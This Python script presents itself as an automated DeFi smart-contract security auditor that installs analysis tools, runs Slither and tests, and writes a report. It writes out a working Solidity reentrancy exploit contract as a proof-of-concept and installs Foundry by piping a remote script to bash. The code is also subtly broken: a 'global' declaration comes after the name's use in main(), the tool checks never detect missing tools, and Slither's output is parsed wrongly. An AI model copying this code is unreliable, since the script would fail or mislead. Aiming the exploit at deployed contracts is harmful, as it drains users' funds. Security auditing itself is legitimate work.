#!/usr/bin/env python3
"""
audit_agent.py

Automated DeFi Smart‑Contract Security Auditor
Clones or copies a repo, runs static & dynamic analysis, generates
Immunefi‑style Markdown report with PoCs.
"""

import argparse
import subprocess
import sys
import os
import shutil
import json
import logging
from datetime import datetime

# ─── Configuration ─────────────────────────────────────────────────────────────

WORKSPACE_DIR = "audit_workspace"
REPORT_FILE   = "audit_report.md"

# ─── Helper Functions ─────────────────────────────────────────────────────────

def run(cmd, cwd=None, capture=False):
    """Run a shell command, exit on failure."""
    print(f"\n>>> RUN: {cmd}")
    result = subprocess.run(
        cmd, shell=True, cwd=cwd,
        stdout=subprocess.PIPE if capture else None,
        stderr=subprocess.STDOUT
    )
    if result.returncode != 0:
        print(f"ERROR: command failed: {cmd}")
        if capture:
            print(result.stdout.decode())
        sys.exit(1)
    return result.stdout.decode() if capture else ""

def ensure_tool(name, check_cmd, install_cmd):
    """Check for a tool; install it if missing."""
    try:
        subprocess.run(
            check_cmd, shell=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        print(f"[OK] {name} found")
    except:
        print(f"[INSTALL] Installing {name}")
        run(install_cmd)


# ─── Phase 1: Scope Initialization ──────────────────────────────────────────────

def init_workspace(git_url, local_path):
    # 1. Remove old workspace if it exists
    if os.path.exists(WORKSPACE_DIR):
        shutil.rmtree(WORKSPACE_DIR)
    # 2. Create fresh workspace
    os.makedirs(WORKSPACE_DIR)
    # 3. Clone or copy code
    if git_url:
        run(f"git clone {git_url} .", cwd=WORKSPACE_DIR)
    else:
        abs_path = os.path.abspath(local_path)
        shutil.copytree(
            abs_path,
            WORKSPACE_DIR,
            dirs_exist_ok=True
        )
    print(f"[WORKSPACE] Code available in ./{WORKSPACE_DIR}")


# ─── Phase 2: Tools Setup & Installation ────────────────────────────────────────

def install_tools():
    # Slither (static analysis)
    ensure_tool(
        "slither",
        "slither --version",
        "pip install slither-analyzer"
    )

    # Foundry (dynamic testing & fuzzing)
    try:
        subprocess.run(
            "forge --version",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[OK] Foundry detected")
    except:
        print("[INSTALL] Foundry")
        run("curl -L https://foundry.paradigm.xyz | bash && foundryup")

    # Hardhat fallback
    try:
        subprocess.run(
            "npx hardhat --version",
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[OK] Hardhat detected")
    except:
        print("[INSTALL] Hardhat (npm)")
        run("npm install --save-dev hardhat")

    # Solidity compiler
    ensure_tool(
        "solc",
        "solc --version",
        "npm install -g solc"
    )

    # Python libraries for reporting
    run("pip install rich requests")


# ─── Phase 3: Static Analysis with Slither ─────────────────────────────────────

def run_static_analysis():
    out = run("slither . --json slither-output.json", cwd=WORKSPACE_DIR, capture=True)
    print("[SLITHER] Output saved to slither-output.json")

# ─── Phase 4: Gas Optimization Analysis ────────────────────────────────────────

def run_gas_analysis():
    # Naïve pattern search
    issues = []
    for root, _, files in os.walk(os.path.join(WORKSPACE_DIR)):
        for f in files:
            if f.endswith(".sol"):
                path = os.path.join(root, f)
                with open(path) as fd:
                    src = fd.read()
                if "uint256" in src and "struct" in src:
                    issues.append(f"{f}: check variable packing")
    with open(os.path.join(WORKSPACE_DIR, "gas-optimizations.json"), "w") as fd:
        json.dump(issues, fd, indent=2)
    print("[GAS] Findings saved to gas-optimizations.json")

# ─── Phase 5: Dynamic Testing & Fuzzing ────────────────────────────────────────

def run_dynamic_tests():
    # decide framework
    use_foundry = os.path.exists(os.path.join(WORKSPACE_DIR, "foundry.toml"))
    if use_foundry:
        run("forge build", cwd=WORKSPACE_DIR)
        run("forge test --fuzz", cwd=WORKSPACE_DIR)
    else:
        run("npx hardhat compile", cwd=WORKSPACE_DIR)
        run("npx hardhat test", cwd=WORKSPACE_DIR)
    print("[DYNAMIC] Tests & fuzzing complete")

# ─── Phase 6: Exploit Generation (Proof‑of‑Concept) ─────────────────────────────

def generate_pocs():
    poc_dir = os.path.join(WORKSPACE_DIR, "pocs")
    os.makedirs(poc_dir, exist_ok=True)
    # Example template for reentrancy PoC
    template = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
interface IVictim { function withdraw() external; function deposit() payable external; }
contract Exploit {{
    IVictim public victim;
    constructor(address _victim) {{ victim = IVictim(_victim); }}
    receive() external payable {{
        if (address(victim).balance >= 1 ether) {{
            victim.withdraw();
        }}
    }}
    function attack() external payable {{
        victim.deposit{{value: msg.value}}();
        victim.withdraw();
    }}
}}
"""
    poc_path = os.path.join(poc_dir, "ReentrancyExploit.sol")
    with open(poc_path, "w") as fd:
        fd.write(template)
    print(f"[PoC] Reentrancy PoC written to {poc_path}")

# ─── Phase 7: Report Generation ────────────────────────────────────────────────

def generate_report():
    slither = json.load(open(os.path.join(WORKSPACE_DIR, "slither-output.json")))
    gas    = json.load(open(os.path.join(WORKSPACE_DIR, "gas-optimizations.json")))
    now    = datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
    with open(REPORT_FILE, "w") as rpt:
        rpt.write(f"# Security Audit Report\n\n")
        rpt.write(f"- **Date:** {now}\n")
        rpt.write(f"- **Scope:** `{WORKSPACE_DIR}`\n\n")
        rpt.write("## Summary of Findings\n\n")
        rpt.write(f"- Slither issues: {len(slither)} items\n")
        rpt.write(f"- Gas optimizations: {len(gas)} items\n\n")
        rpt.write("## Detailed Findings\n\n")
        for idx, issue in enumerate(slither, 1):
            sev = issue.get("severity", "Unknown")
            title = issue.get("check", "Unnamed")
            rpt.write(f"### {idx}. {title} ({sev})\n")
            rpt.write(f"> {issue.get('description', '').splitlines()[0]}\n\n")
            rpt.write("**Reproduction:**\n```bash\nslither .\n```\n\n")
            rpt.write("---\n\n")
        rpt.write("## Gas Optimizations\n\n")
        for item in gas:
            rpt.write(f"- {item}\n")
        rpt.write("\n---\n\n")
        rpt.write("## Proof‑of‑Concepts\n\n")
        rpt.write("See `/pocs/ReentrancyExploit.sol` for a reentrancy example.\n")
    print(f"[REPORT] Generated {REPORT_FILE}")

# ─── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Security Audit Agent: static + dynamic analysis + report + PoC")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-g", "--git",    help="GitHub repo URL to clone")
    group.add_argument("-c", "--copy",   help="Local folder path to copy")
    parser.add_argument("-o", "--output", help="Output report filename",
                        default=REPORT_FILE)
    args = parser.parse_args()

    install_tools()
    init_workspace(args.git, args.copy)
    run_static_analysis()
    run_gas_analysis()
    run_dynamic_tests()
    generate_pocs()
    # rename report if custom
    global REPORT_FILE
    REPORT_FILE = args.output
    generate_report()

if __name__ == "__main__":
    main()
